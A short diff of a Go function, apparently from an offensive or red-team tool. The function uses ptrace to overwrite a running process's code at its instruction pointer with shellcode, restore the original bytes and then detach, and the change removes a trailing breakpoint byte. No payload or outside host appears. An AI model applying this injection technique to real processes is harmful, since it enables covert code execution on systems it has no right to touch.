@@ -164,7 +164,7 @@ func Injector(shellcode *string, pid int) error {
 	log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)
 
 	// save current code for restoring later
-	origCode := make([]byte, len(sc)+1)
+	origCode := make([]byte, len(sc))
 	n, err := syscall.PtracePeekText(pid, uintptr(origRip), origCode)
 	if err != nil {
 		return fmt.Errorf("PEEK: 0x%x", origRip)
@@ -172,11 +172,7 @@ func Injector(shellcode *string, pid int) error {
 	log.Printf("Peeked %d bytes of original code: %x at RIP (0x%x)", n, origCode, origRip)
 
 	// write shellcode to .text section, where RIP is pointing at
-	bp, err := hex.DecodeString("cc")
-	if err != nil {
-		return fmt.Errorf("bp decode")
-	}
-	data := append(sc, bp...)
+	data := sc
 	n, err = syscall.PtracePokeText(pid, uintptr(origRip), data)
 	if err != nil {
 		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
@@ -241,15 +237,12 @@ func Injector(shellcode *string, pid int) error {
 		}
 		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)
 
-		// continue and wait
-		err = syscall.PtraceCont(pid, 0)
+		// let it run
+		err = syscall.PtraceDetach(pid)
 		if err != nil {
-			return fmt.Errorf("Continue: %v", err)
+			return fmt.Errorf("Continue detach: %v", err)
 		}
-		_, err = syscall.Wait4(pid, &ws, 0, nil)
-		if err != nil {
-			return fmt.Errorf("continue: wait4: %v", err)
-		}
+		log.Printf("%d will continue to run", pid)
 
 		return nil
 	default:
